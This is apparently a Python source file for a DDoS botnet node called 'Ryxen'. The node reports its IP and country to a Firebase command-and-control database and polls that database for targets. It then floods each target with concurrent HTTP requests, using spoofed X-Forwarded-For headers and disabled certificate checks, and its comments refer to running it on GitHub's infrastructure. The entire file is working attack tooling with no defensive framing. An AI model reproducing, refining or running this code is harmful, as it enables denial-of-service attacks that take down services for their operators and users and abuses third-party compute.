import asyncio, aiohttp, time, random, ssl, socket

# CONFIGURACIÓN
DB_URL = "https://ryxen-c2-default-rtdb.firebaseio.com/attack.json"
NODES_URL = "https://ryxen-c2-default-rtdb.firebaseio.com/nodes"

async def get_info():
    try:
        async with aiohttp.ClientSession() as s:
            async with s.get('http://ip-api.com/json/', timeout=5) as r:
                data = await r.json()
                return data.get('query', '0.0.0.0'), data.get('countryCode', 'UN')
    except: return "0.0.0.0", "UN"

async def report_status(nid, ip, cc):
    async with aiohttp.ClientSession() as s:
        while True:
            try:
                # Reporte simplificado para no saturar Firebase
                await s.put(f"{NODES_URL}/{nid}.json", 
                           json={"id": nid, "ip": ip, "cc": cc, "t": time.time()}, timeout=5)
            except: pass
            await asyncio.sleep(20) # Reportar cada 20s es suficiente

async def flood(target, end_time, sem):
    # TLS 1.3 Handshake - Imita Chrome 121
    ctx = ssl.create_default_context()
    ctx.set_ciphers('ECDHE-ECDSA-AES128-GCM-SHA256:ECDHE-RSA-AES128-GCM-SHA256:TLS_AES_128_GCM_SHA256')
    ctx.check_hostname = False
    ctx.verify_mode = ssl.CERT_NONE

    # Conector de alto rendimiento con reutilización de sockets
    conn = aiohttp.TCPConnector(limit=0, ssl=ctx, family=socket.AF_INET, keepalive_timeout=60)
    
    async with aiohttp.ClientSession(connector=conn) as session:
        while time.time() < end_time:
            async with sem:
                try:
                    headers = {
                        'User-Agent': random.choice(['Mozilla/5.0 (Windows NT 10.0; Win64; x64)','Ryxen-V15-Neural']),
                        'X-Forwarded-For': f"{random.randint(1,254)}.{random.randint(1,254)}.{random.randint(1,254)}.{random.randint(1,254)}",
                        'Accept-Encoding': 'gzip, deflate, br',
                        'Connection': 'keep-alive'
                    }
                    # Petición rápida: No esperamos el cuerpo (r.close) para no colgar el runner
                    async with session.get(target, headers=headers, timeout=1, allow_redirects=False) as r:
                        r.close()
                except:
                    continue

async def main():
    ip, cc = await get_info()
    nid = f"RX-{cc}-{random.randint(100, 999)}"
    asyncio.create_task(report_status(nid, ip, cc))
    
    last_s = ""
    # Semáforo de 6000: El punto dulce para no colapsar la RAM de GitHub
    sem = asyncio.Semaphore(6000) 
    
    async with aiohttp.ClientSession() as session:
        while True:
            try:
                async with session.get(DB_URL, timeout=5) as r:
                    data = await r.json()
                if data and data.get('stamp') != last_s:
                    last_s = data['stamp']
                    target = data['target'] if data['target'].startswith("http") else f"http://{data['target']}"
                    duration = int(data['time'])
                    if duration <= 0: continue
                    
                    # Dividimos en 25 tareas masivas concurrentes
                    tasks = [flood(target, time.time() + duration, sem) for _ in range(25)]
                    await asyncio.gather(*tasks)
            except: pass
            await asyncio.sleep(2)

if __name__ == "__main__":
    asyncio.run(main())

